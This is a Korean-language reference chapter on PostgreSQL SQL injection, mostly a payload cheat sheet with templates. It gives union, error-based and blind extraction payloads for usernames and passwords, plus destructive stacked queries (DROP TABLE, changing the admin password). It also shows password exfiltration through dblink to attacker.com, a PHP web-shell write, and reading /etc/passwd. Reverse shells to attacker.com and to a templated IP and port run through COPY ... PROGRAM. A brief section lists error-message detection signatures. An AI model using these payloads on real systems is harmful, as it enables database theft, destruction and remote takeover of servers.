# PostgreSQL SQL Injection 완전 정복

> PostgreSQL 전용 SQLi 기법 상세 문서
> 버전: 1.0
> 최종 수정: 2025-01-26

---

## 목차

1. [PostgreSQL 기본 특성](#1-postgresql-기본-특성)
2. [문자열 및 식별자 처리](#2-문자열-및-식별자-처리)
3. [주석 문법](#3-주석-문법)
4. [핵심 함수](#4-핵심-함수)
5. [시스템 카탈로그](#5-시스템-카탈로그)
6. [Error-based Injection](#6-error-based-injection)
7. [Union-based Injection](#7-union-based-injection)
8. [Boolean-based Blind](#8-boolean-based-blind)
9. [Time-based Blind](#9-time-based-blind)
10. [Out-of-band Techniques](#10-out-of-band-techniques)
11. [Stacked Queries](#11-stacked-queries)
12. [파일 작업 및 명령 실행](#12-파일-작업-및-명령-실행)
13. [PostgreSQL 전용 우회 기법](#13-postgresql-전용-우회-기법)
14. [버전별 차이점](#14-버전별-차이점)
15. [탐지 시그니처](#15-탐지-시그니처)
16. [치트시트](#16-치트시트)

---

## 1. PostgreSQL 기본 특성

### 1.1 버전 정보

```
┌─────────────────────────────────────────────────────────────┐
│                  PostgreSQL 주요 버전                        │
├──────────┬──────────────────────────────────────────────────┤
│  버전    │  특징                                           │
├──────────┼──────────────────────────────────────────────────┤
│  9.0     │  Hot Standby, Streaming Replication             │
│  9.1     │  Synchronous Replication, pg_stat_statements    │
│  9.2     │  Index-only Scans, Range Types                  │
│  9.3     │  Materialized Views, JSON 함수                  │
│  9.4     │  JSONB, pg_stat_activity 개선                  │
│  9.5     │  UPSERT (ON CONFLICT), Row Level Security       │
│  9.6     │  Parallel Query                                 │
│  10      │  Declarative Partitioning, Logical Replication  │
│  11      │  JIT Compilation, Stored Procedures            │
│  12      │  JSON Path, Generated Columns                   │
│  13      │  Parallel Vacuum, Incremental Sorting          │
│  14      │  Connection Pipelining, JSON 개선              │
│  15      │  MERGE, Security 개선                          │
│  16      │  Logical Replication 개선                      │
└──────────┴──────────────────────────────────────────────────┘
```

### 1.2 기본 설정 확인

```sql
-- 버전 확인
SELECT version();
-- 예: PostgreSQL 14.5 on x86_64-pc-linux-gnu...

-- 짧은 버전
SELECT current_setting('server_version');
SHOW server_version;

-- 현재 사용자
SELECT current_user;
SELECT session_user;
SELECT user;
SELECT getpgusername();

-- 현재 데이터베이스
SELECT current_database();
SELECT current_catalog;

-- 현재 스키마
SELECT current_schema();
SELECT current_schemas(true);

-- 기타 정보
SELECT inet_server_addr();    -- 서버 IP
SELECT inet_server_port();    -- 서버 포트
SELECT inet_client_addr();    -- 클라이언트 IP
SELECT pg_backend_pid();      -- 백엔드 PID
```

### 1.3 권한 확인

```sql
-- 슈퍼유저 확인
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = current_user;

-- 현재 사용자 권한
SELECT * FROM pg_roles WHERE rolname = current_user;

-- 데이터베이스 권한
SELECT * FROM pg_database WHERE datname = current_database();

-- 테이블 권한
SELECT * FROM information_schema.table_privileges
WHERE grantee = current_user;
```

---

## 2. 문자열 및 식별자 처리

### 2.1 문자열 리터럴

```sql
-- 기본 문자열 (단일 따옴표만!)
SELECT 'hello';

-- 이중 따옴표는 식별자용 (MySQL과 다름!)
SELECT "column_name";   -- 컬럼명
SELECT 'value';         -- 문자열 값

-- 이스케이프
SELECT 'it''s';              -- 따옴표 두 번 (표준)
SELECT E'it\'s';             -- 백슬래시 이스케이프 (E-string)

-- E-string (Escape String)
SELECT E'line1\nline2';      -- 줄바꿈
SELECT E'tab\there';         -- 탭
SELECT E'\x61\x64\x6D\x69\x6E';  -- Hex: 'admin'

-- Dollar Quoting (PostgreSQL 전용!)
SELECT $$hello$$;                    -- 'hello'
SELECT $tag$hello$tag$;              -- 'hello' (태그 지정)
SELECT $q$it's easy$q$;              -- 따옴표 포함 가능
SELECT $body$
    multi-line
    string
$body$;

-- Unicode
SELECT U&'\0041\0042\0043';          -- 'ABC'
SELECT U&'\+000041';                 -- 'A'
```

### 2.2 문자열 연결

```sql
-- 파이프 연산자 (||) - 표준 SQL
SELECT 'hel' || 'lo';                -- 'hello'
SELECT 'a' || 'b' || 'c';            -- 'abc'

-- CONCAT 함수
SELECT CONCAT('hel', 'lo');          -- 'hello'
SELECT CONCAT('a', 'b', 'c');        -- 'abc'

-- CONCAT_WS (구분자 포함)
SELECT CONCAT_WS(',', 'a', 'b', 'c'); -- 'a,b,c'

-- SQLi 활용
SELECT * FROM users WHERE name = 'ad' || 'min';
```

### 2.3 식별자

```sql
-- 이중 따옴표로 감싸기 (예약어 사용 가능)
SELECT * FROM "select";
SELECT "column" FROM "table";

-- 대소문자 구분
SELECT * FROM Users;   -- users로 처리 (소문자화)
SELECT * FROM "Users"; -- Users 그대로 (대소문자 유지)

-- 예약어 우회
SELECT * FROM "users" WHERE "select" = 1;
```

### 2.4 타입 캐스팅

```sql
-- :: 연산자 (PostgreSQL 전용)
SELECT '123'::integer;
SELECT 123::text;
SELECT '2023-01-01'::date;

-- CAST 함수 (표준)
SELECT CAST('123' AS integer);
SELECT CAST(123 AS text);

-- SQLi 활용
SELECT * FROM users WHERE id = '1'::integer;
```

---

## 3. 주석 문법

### 3.1 기본 주석

```sql
-- 한 줄 주석 (더블 대시 + 공백)
SELECT * FROM users -- comment
SELECT * FROM users --comment  -- 공백 없어도 됨 (MySQL과 다름)

-- 블록 주석
SELECT * FROM users /* comment */
SELECT /* comment */ * FROM users

-- 중첩 주석 지원! (PostgreSQL 특수)
SELECT * /* outer /* inner */ outer */ FROM users

-- 주석으로 공백 대체
SELECT/**/password/**/FROM/**/users
```

### 3.2 주석 활용 우회

```sql
-- 인라인 주석으로 키워드 분리
UN/**/ION SEL/**/ECT

-- 중첩 주석 활용 (PostgreSQL 전용)
UN/*test/*nested*/test*/ION SEL/**/ECT

-- 주석 안에 특수문자
SELECT/*'*/* FROM users
```

---

## 4. 핵심 함수

### 4.1 정보 수집 함수

```sql
-- 버전
version()                     -- 전체 버전 문자열
current_setting('server_version')  -- 짧은 버전

-- 사용자
current_user                  -- 현재 사용자
session_user                  -- 세션 사용자
user                          -- current_user와 동일
getpgusername()               -- 사용자명

-- 데이터베이스
current_database()            -- 현재 DB
current_catalog               -- current_database()와 동일
current_schema()              -- 현재 스키마

-- 네트워크
inet_server_addr()            -- 서버 IP
inet_server_port()            -- 서버 포트
inet_client_addr()            -- 클라이언트 IP
inet_client_port()            -- 클라이언트 포트

-- 프로세스
pg_backend_pid()              -- 현재 백엔드 PID
```

### 4.2 문자열 함수

```sql
-- 연결
'a' || 'b'                    -- 'ab'
CONCAT('a', 'b')              -- 'ab'
CONCAT_WS('-', 'a', 'b')      -- 'a-b'

-- 추출
SUBSTRING('hello' FROM 2 FOR 3)  -- 'ell'
SUBSTRING('hello', 2, 3)         -- 'ell'
SUBSTR('hello', 2, 3)            -- 'ell'
LEFT('hello', 2)                 -- 'he'
RIGHT('hello', 2)                -- 'lo'

-- 위치
POSITION('l' IN 'hello')      -- 3
STRPOS('hello', 'l')          -- 3

-- 길이
LENGTH('hello')               -- 5
CHAR_LENGTH('hello')          -- 5
OCTET_LENGTH('hello')         -- 5 (바이트)

-- 변환
UPPER('hello')                -- 'HELLO'
LOWER('HELLO')                -- 'hello'
REVERSE('hello')              -- 'olleh'
REPLACE('hello', 'l', 'x')    -- 'hexxo'
TRIM('  hello  ')             -- 'hello'
LPAD('hi', 5, '0')            -- '000hi'
RPAD('hi', 5, '0')            -- 'hi000'

-- ASCII
ASCII('a')                    -- 97
CHR(97)                       -- 'a'
```

### 4.3 조건 함수

```sql
-- CASE
CASE WHEN condition THEN result ELSE default END
CASE WHEN 1=1 THEN 'yes' ELSE 'no' END

-- COALESCE
COALESCE(NULL, NULL, 'value')  -- 첫 번째 non-NULL

-- NULLIF
NULLIF(a, b)                   -- a=b면 NULL

-- GREATEST / LEAST
GREATEST(1, 2, 3)              -- 3
LEAST(1, 2, 3)                 -- 1
```

### 4.4 시간 지연 함수

```sql
-- pg_sleep (초 단위, 소수점 가능)
SELECT pg_sleep(5);            -- 5초 지연
SELECT pg_sleep(0.5);          -- 0.5초 지연

-- pg_sleep_for (interval)
SELECT pg_sleep_for('5 seconds');
SELECT pg_sleep_for('500 milliseconds');

-- pg_sleep_until (특정 시간까지)
SELECT pg_sleep_until('2023-01-01 12:00:00');

-- 조건부 지연
SELECT CASE WHEN 1=1 THEN pg_sleep(5) END;

-- SQLi 활용
'; SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### 4.5 배열 함수

```sql
-- 배열 생성
SELECT ARRAY[1,2,3];
SELECT '{1,2,3}'::int[];

-- 배열 요소 접근
SELECT (ARRAY['a','b','c'])[1];  -- 'a' (1-based index)

-- 배열 → 문자열
SELECT array_to_string(ARRAY['a','b','c'], ',');  -- 'a,b,c'

-- 문자열 → 배열
SELECT string_to_array('a,b,c', ',');  -- {a,b,c}

-- SQLi 활용 (한 줄로 추출)
SELECT array_to_string(ARRAY(SELECT tablename FROM pg_tables WHERE schemaname='public'), ',');
```

---

## 5. 시스템 카탈로그

### 5.1 데이터베이스 목록

```sql
-- pg_database
SELECT datname FROM pg_database;

-- information_schema
SELECT catalog_name FROM information_schema.schemata;

-- 현재 사용자 접근 가능한 DB
SELECT datname FROM pg_database WHERE datistemplate = false;
```

### 5.2 스키마 목록

```sql
-- pg_namespace
SELECT nspname FROM pg_namespace;

-- information_schema
SELECT schema_name FROM information_schema.schemata;

-- 공개 스키마
SELECT nspname FROM pg_namespace WHERE nspname NOT LIKE 'pg_%' AND nspname != 'information_schema';
```

### 5.3 테이블 목록

```sql
-- pg_tables
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- pg_class
SELECT relname FROM pg_class WHERE relkind = 'r' AND relnamespace = (SELECT oid FROM pg_namespace WHERE nspname = 'public');

-- information_schema
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';

-- 모든 테이블 (schema.table 형식)
SELECT schemaname || '.' || tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog', 'information_schema');
```

### 5.4 컬럼 목록

```sql
-- pg_attribute
SELECT attname FROM pg_attribute WHERE attrelid = 'users'::regclass AND attnum > 0;

-- information_schema
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

-- 컬럼 타입 포함
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users';
```

### 5.5 한 줄로 추출

```sql
-- string_agg (GROUP_CONCAT 대체)
SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname = 'public';

-- array_agg + array_to_string
SELECT array_to_string(array_agg(tablename), ',') FROM pg_tables WHERE schemaname = 'public';

-- 컬럼과 함께
SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name = 'users';
```

### 5.6 기타 유용한 카탈로그

```sql
-- 사용자/역할
SELECT * FROM pg_user;
SELECT * FROM pg_roles;

-- 권한
SELECT * FROM pg_auth_members;

-- 설정
SELECT * FROM pg_settings;

-- 연결 상태
SELECT * FROM pg_stat_activity;

-- 확장
SELECT * FROM pg_extension;
```

---

## 6. Error-based Injection

### 6.1 CAST 에러

```sql
-- 잘못된 타입 변환으로 에러 유발
SELECT CAST((SELECT version()) AS integer);
-- 에러: invalid input syntax for type integer: "PostgreSQL 14.5..."

-- SQLi에서
' AND CAST((SELECT version()) AS integer)=1--
' AND CAST((SELECT username FROM users LIMIT 1) AS integer)=1--
-- 에러 메시지에 데이터 포함
```

### 6.2 :: 연산자 에러

```sql
-- 타입 캐스팅 에러
SELECT (SELECT version())::integer;

-- SQLi에서
' AND (SELECT password FROM users LIMIT 1)::integer=1--
-- 에러: invalid input syntax for type integer: "admin_password"
```

### 6.3 XML 함수 에러

```sql
-- XMLPARSE 에러
SELECT XMLPARSE(DOCUMENT (SELECT version()));
-- 에러에 데이터 포함

-- query_to_xml
SELECT query_to_xml('SELECT * FROM invalid_table', true, true, '');
```

### 6.4 정규식 에러

```sql
-- 잘못된 정규식
SELECT 1 WHERE 'a' ~ (SELECT version());
-- 에러에 데이터 포함
```

### 6.5 JSON 에러 (9.3+)

```sql
-- 잘못된 JSON
SELECT (SELECT username FROM users LIMIT 1)::json;
-- 에러에 데이터 포함
```

### 6.6 에러 기반 한계

```
PostgreSQL은 MySQL만큼 에러 메시지에 데이터를 많이 포함하지 않음
- 보통 CAST 에러가 가장 효과적
- 에러 출력 설정에 따라 다름
- Blind 방식이 더 안정적인 경우 많음
```

---

## 7. Union-based Injection

### 7.1 컬럼 수 파악

```sql
-- ORDER BY 방식
' ORDER BY 1--
' ORDER BY 5--
' ORDER BY 6--  (에러 시 컬럼 수 = 5)

-- UNION SELECT NULL 방식
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  (성공 시 컬럼 수 = 3)

-- GROUP BY 방식
' GROUP BY 1--
' GROUP BY 2--
```

### 7.2 출력 위치 파악

```sql
-- 숫자로 확인
' UNION SELECT 1,2,3,4--

-- 문자열로 확인 (타입 문제 방지)
' UNION SELECT NULL,'a',NULL,'b'--

-- 타입 명시
' UNION SELECT NULL,version(),NULL,current_user--
```

### 7.3 데이터 추출 단계

```sql
-- Step 1: 데이터베이스 목록
' UNION SELECT NULL,datname,NULL FROM pg_database--

-- Step 2: 테이블 목록
' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--

-- Step 3: 컬럼 목록
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Step 4: 데이터 추출
' UNION SELECT NULL,username||':'||password,NULL FROM users--
```

### 7.4 데이터 타입 문제 해결

```sql
-- NULL 사용 (모든 타입 호환)
' UNION SELECT NULL,NULL,NULL--

-- 명시적 캐스팅
' UNION SELECT NULL,username::text,NULL FROM users--
' UNION SELECT NULL,CAST(id AS text),NULL FROM users--
```

### 7.5 LIMIT/OFFSET

```sql
-- 한 행씩 추출
' UNION SELECT NULL,password,NULL FROM users LIMIT 1 OFFSET 0--
' UNION SELECT NULL,password,NULL FROM users LIMIT 1 OFFSET 1--
' UNION SELECT NULL,password,NULL FROM users LIMIT 1 OFFSET 2--
```

---

## 8. Boolean-based Blind

### 8.1 기본 원리

```sql
-- 참 조건
' AND 1=1--
' AND true--
' AND 'a'='a'--

-- 거짓 조건
' AND 1=2--
' AND false--
' AND 'a'='b'--
```

### 8.2 데이터 추출

```sql
-- 문자 비교
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--

-- ASCII 이진 탐색
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)) > 96--

-- SIMILAR TO (정규식)
' AND (SELECT username FROM users LIMIT 1) SIMILAR TO 'a%'--

-- LIKE
' AND (SELECT username FROM users LIMIT 1) LIKE 'a%'--
```

### 8.3 문자열 길이 확인

```sql
' AND LENGTH((SELECT username FROM users LIMIT 1)) > 5--
' AND LENGTH((SELECT username FROM users LIMIT 1)) = 5--
' AND CHAR_LENGTH((SELECT username FROM users LIMIT 1)) = 5--
```

### 8.4 행 수 확인

```sql
' AND (SELECT COUNT(*) FROM users) > 10--
' AND (SELECT COUNT(*) FROM users) = 15--
```

### 8.5 비트 연산

```sql
-- 비트 단위 추출
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 128)::int = 128--
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 64)::int = 64--
```

---

## 9. Time-based Blind

### 9.1 pg_sleep 기반

```sql
-- 기본 지연
'; SELECT pg_sleep(5)--
' AND pg_sleep(5) IS NOT NULL--

-- 조건부 지연
'; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--
' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL--

-- 데이터 추출
'; SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- ASCII 이진 탐색
'; SELECT CASE WHEN ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96 THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### 9.2 pg_sleep_for

```sql
-- interval 사용
SELECT pg_sleep_for('5 seconds');
SELECT pg_sleep_for('500 milliseconds');

-- 조건부
SELECT CASE WHEN 1=1 THEN pg_sleep_for('5 seconds') END;
```

### 9.3 무거운 쿼리

```sql
-- pg_sleep 차단 시 대안
-- 대량 연산으로 지연
'; SELECT COUNT(*) FROM pg_class a, pg_class b, pg_class c--

-- generate_series
'; SELECT * FROM generate_series(1, 10000000)--
```

---

## 10. Out-of-band Techniques

### 10.1 COPY TO (파일 쓰기)

```sql
-- 슈퍼유저 권한 필요
COPY (SELECT version()) TO '/tmp/out.txt';
COPY (SELECT * FROM users) TO '/tmp/users.txt';

-- SQLi에서
'; COPY (SELECT username||':'||password FROM users) TO '/var/www/html/data.txt'--
```

### 10.2 COPY FROM PROGRAM (명령 실행)

```sql
-- PostgreSQL 9.3+ , 슈퍼유저 권한 필요
COPY test FROM PROGRAM 'id';
COPY test FROM PROGRAM 'whoami';

-- 역쉘
COPY test FROM PROGRAM 'bash -i >& /dev/tcp/attacker.com/4444 0>&1';
```

### 10.3 Large Objects

```sql
-- Large Object 생성 (파일 읽기)
SELECT lo_import('/etc/passwd');

-- Large Object 내용 읽기
SELECT lo_get(12345);  -- OID

-- Large Object로 파일 쓰기
SELECT lo_export(12345, '/tmp/output.txt');
```

### 10.4 dblink (원격 연결)

```sql
-- dblink 확장 필요
-- 원격 서버로 데이터 전송
SELECT * FROM dblink('host=attacker.com dbname=test user=a password=' || (SELECT password FROM users LIMIT 1), 'SELECT 1') AS t(a int);
```

### 10.5 DNS Exfiltration (제한적)

```sql
-- PostgreSQL은 기본적으로 DNS 조회 기능 제한적
-- dblink 또는 확장 필요

-- dblink로 DNS 유발
SELECT * FROM dblink('host=' || (SELECT password FROM users LIMIT 1) || '.attacker.com', 'SELECT 1');
```

---

## 11. Stacked Queries

### 11.1 PostgreSQL의 Stacked Queries

```
PostgreSQL은 기본적으로 Stacked Queries 지원!
- ; 으로 여러 쿼리 실행 가능
- MySQL보다 훨씬 위험
- 대부분의 드라이버에서 동작
```

### 11.2 활용 예시

```sql
-- 테이블 삭제
'; DROP TABLE users;--

-- 데이터 삽입
'; INSERT INTO users VALUES ('hacker', 'password');--

-- 데이터 수정
'; UPDATE users SET password='hacked' WHERE username='admin';--

-- 테이블 생성
'; CREATE TABLE temp (data text);--

-- 함수 생성
'; CREATE FUNCTION shell(text) RETURNS text AS $$ ... $$ LANGUAGE plpython3u;--
```

### 11.3 시간 지연 활용

```sql
-- Stacked Query로 지연
'; SELECT pg_sleep(5);--

-- 조건부 지연
'; SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' THEN pg_sleep(5) END;--
```

---

## 12. 파일 작업 및 명령 실행

### 12.1 파일 읽기

```sql
-- pg_read_file (슈퍼유저, PostgreSQL 10+)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/passwd', 0, 100);  -- offset, length

-- Large Object
SELECT lo_import('/etc/passwd');
SELECT encode(lo_get(OID), 'escape');

-- COPY (데이터 로드)
CREATE TEMP TABLE temp(content text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;
```

### 12.2 파일 쓰기

```sql
-- COPY TO
COPY (SELECT 'content') TO '/tmp/output.txt';
COPY (SELECT * FROM users) TO '/tmp/users.csv' WITH CSV;

-- Large Object
SELECT lo_from_bytea(0, 'content');
SELECT lo_export(OID, '/tmp/output.txt');

-- 웹쉘 생성
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

### 12.3 명령 실행

```sql
-- COPY FROM PROGRAM (PostgreSQL 9.3+)
CREATE TEMP TABLE cmd(output text);
COPY cmd FROM PROGRAM 'id';
SELECT * FROM cmd;

-- 직접 명령 실행
COPY (SELECT '') TO PROGRAM 'id';

-- 역쉘
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"';

-- PL/Python (확장 필요)
CREATE FUNCTION shell(cmd text) RETURNS text AS $$
import subprocess
return subprocess.check_output(cmd, shell=True)
$$ LANGUAGE plpython3u;

SELECT shell('whoami');
```

### 12.4 권한 및 제약

```
파일/명령 작업 조건:
1. 대부분 슈퍼유저 권한 필요
2. PostgreSQL 서비스 계정 권한으로 실행
3. SELinux/AppArmor 제한 가능
4. pg_read_file은 data directory 내로 제한 (기본)

확인:
SELECT current_setting('is_superuser');
SELECT pg_read_file('/etc/passwd');  -- 에러 시 권한 없음
```

---

## 13. PostgreSQL 전용 우회 기법

### 13.1 Dollar Quoting (쿼트 우회)

```sql
-- 기본 Dollar Quote
SELECT $$admin$$;              -- 'admin'
SELECT $tag$admin$tag$;        -- 'admin'

-- 따옴표 포함 가능
SELECT $q$it's$q$;             -- "it's"

-- SQLi에서
SELECT * FROM users WHERE name = $$admin$$;
' UNION SELECT NULL,$$admin$$,NULL--

-- 다양한 태그
SELECT $a$test$a$;
SELECT $_$test$_$;
SELECT $1$test$1$;
```

### 13.2 CHR 함수

```sql
-- ASCII 코드로 문자 생성
SELECT CHR(97);                -- 'a'
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);  -- 'admin'

-- SQLi에서 (Quote 필터 우회)
SELECT * FROM users WHERE name = CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);
```

### 13.3 :: 타입 캐스팅

```sql
-- 문자열 우회
SELECT 1::text;
SELECT 'admin'::name;

-- 정수로 변환
SELECT '123'::int;

-- SQLi에서 타입 문제 해결
' UNION SELECT NULL,id::text,NULL FROM users--
```

### 13.4 배열 활용

```sql
-- 배열로 우회
SELECT (ARRAY['admin'])[1];
SELECT (ARRAY[username])[1] FROM users;

-- string_to_array
SELECT (string_to_array('admin,user', ','))[1];  -- 'admin'
```

### 13.5 WITH 절 (CTE)

```sql
-- Common Table Expression
WITH passwords AS (SELECT password FROM users)
SELECT * FROM passwords;

-- SQLi에서
'; WITH p AS (SELECT password FROM users) SELECT * FROM p--
```

### 13.6 공백 대체

```sql
-- 가능한 공백 문자
%09  Tab
%0A  Line Feed
%0C  Form Feed
%0D  Carriage Return

-- 주석으로 공백
SELECT/**/password/**/FROM/**/users

-- 괄호로 공백 제거
SELECT(password)FROM(users)
```

---

## 14. 버전별 차이점

### 14.1 PostgreSQL 9.x

```sql
-- 9.0+: 스트리밍 복제
-- 9.3+: COPY FROM PROGRAM (RCE!)
COPY test FROM PROGRAM 'id';

-- 9.4+: JSONB
SELECT '{"name":"admin"}'::jsonb;
SELECT jsonb_extract_path_text('{"user":"admin"}'::jsonb, 'user');

-- 9.5+: UPSERT
INSERT INTO users VALUES (1, 'admin') ON CONFLICT DO NOTHING;
```

### 14.2 PostgreSQL 10+

```sql
-- pg_read_file 확장
SELECT pg_read_file('/etc/passwd');

-- 선언적 파티셔닝
-- 논리 복제

-- 버전 넘버링 변경 (9.6 → 10)
```

### 14.3 PostgreSQL 11+

```sql
-- Stored Procedures (PROCEDURE)
CREATE PROCEDURE test_proc() LANGUAGE SQL AS $$ ... $$;
CALL test_proc();

-- JIT Compilation
```

### 14.4 PostgreSQL 12+

```sql
-- JSON Path
SELECT jsonb_path_query('{"user":"admin"}', '$.user');

-- Generated Columns
```

### 14.5 PostgreSQL 15+

```sql
-- MERGE 문
MERGE INTO users USING source ON ...

-- Security 개선
```

---

## 15. 탐지 시그니처

### 15.1 에러 메시지 패턴

```yaml
postgresql_error_patterns:
  - pattern: "pg_query()"
    confidence: 0.99
    indicates: "PHP pg_* 함수"

  - pattern: "pg_exec()"
    confidence: 0.99
    indicates: "PHP pg_* 함수"

  - pattern: "PSQLException"
    confidence: 0.95
    indicates: "Java PostgreSQL 드라이버"

  - pattern: "org.postgresql"
    confidence: 0.95
    indicates: "Java PostgreSQL 드라이버"

  - pattern: "ERROR:  syntax error at or near"
    confidence: 0.95
    indicates: "PostgreSQL 문법 에러"

  - pattern: "ERROR:  column .* does not exist"
    confidence: 0.90
    indicates: "PostgreSQL 컬럼 에러"

  - pattern: "ERROR:  relation .* does not exist"
    confidence: 0.90
    indicates: "PostgreSQL 테이블 에러"

  - pattern: "invalid input syntax for"
    confidence: 0.90
    indicates: "PostgreSQL 타입 에러"

  - pattern: "unterminated quoted string"
    confidence: 0.85
    indicates: "PostgreSQL 문자열 에러"

  - pattern: "Query failed:"
    confidence: 0.80
    indicates: "PostgreSQL 쿼리 실패"
```

### 15.2 DBMS 확인 페이로드

```sql
-- 문법 특성
' AND true--                  -- PostgreSQL (소문자 boolean)
' AND pg_sleep(0)--           -- PostgreSQL 전용 함수
'::int                        -- PostgreSQL 타입 캐스팅
$$test$$                      -- PostgreSQL Dollar Quote

-- 함수 기반
' AND version() LIKE 'PostgreSQL%'--
' AND current_database() IS NOT NULL--

-- 시스템 테이블
' AND (SELECT 1 FROM pg_database LIMIT 1)=1--
' AND (SELECT 1 FROM pg_tables LIMIT 1)=1--
```

---

## 16. 치트시트

### 16.1 정보 수집 원라이너

```sql
-- 버전
' UNION SELECT NULL,version(),NULL--
'; SELECT CAST(version() AS integer)--  (에러 기반)

-- 사용자
' UNION SELECT NULL,current_user,NULL--

-- 데이터베이스
' UNION SELECT NULL,current_database(),NULL--

-- 모든 DB
' UNION SELECT NULL,string_agg(datname,','),NULL FROM pg_database--

-- 모든 테이블
' UNION SELECT NULL,string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'--

-- 모든 컬럼
' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'--
```

### 16.2 필터 우회 치트시트

```sql
-- Quote 우회
$$admin$$                     -- Dollar Quote
$tag$admin$tag$               -- Tagged Dollar Quote
CHR(97)||CHR(100)||CHR(109)   -- CHR 함수

-- Space 우회
/**/                          -- 주석
%09, %0A, %0D                 -- 공백 문자

-- Keyword 우회
SeLeCt, SEL/**/ECT            -- Case, 주석

-- = 우회
LIKE, SIMILAR TO              -- 비교 대체

-- Comment
-- (공백 불필요), /* */       -- 주석 유형

-- Stacked Query
; SELECT ...                  -- 기본 지원
```

### 16.3 데이터 추출 템플릿

```sql
-- Union-based 템플릿
' UNION SELECT NULL,{payload},NULL--

-- Error-based 템플릿
' AND CAST(({payload}) AS integer)=1--
' AND ({payload})::integer=1--

-- Boolean-based 템플릿
' AND ASCII(SUBSTRING(({payload}),{pos},1))>{mid}--

-- Time-based 템플릿
'; SELECT CASE WHEN ASCII(SUBSTRING(({payload}),{pos},1))>{mid} THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Stacked Query 템플릿
'; {query};--
```

### 16.4 명령 실행 템플릿

```sql
-- COPY FROM PROGRAM
'; CREATE TEMP TABLE cmd(output text); COPY cmd FROM PROGRAM '{command}'; SELECT * FROM cmd;--

-- 간단 버전
'; COPY (SELECT '') TO PROGRAM '{command}';--

-- 역쉘
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"';--
```

---

> **이전 문서**: 03_DBMS_MySQL.md
> **다음 문서**: 05_DBMS_MSSQL.md
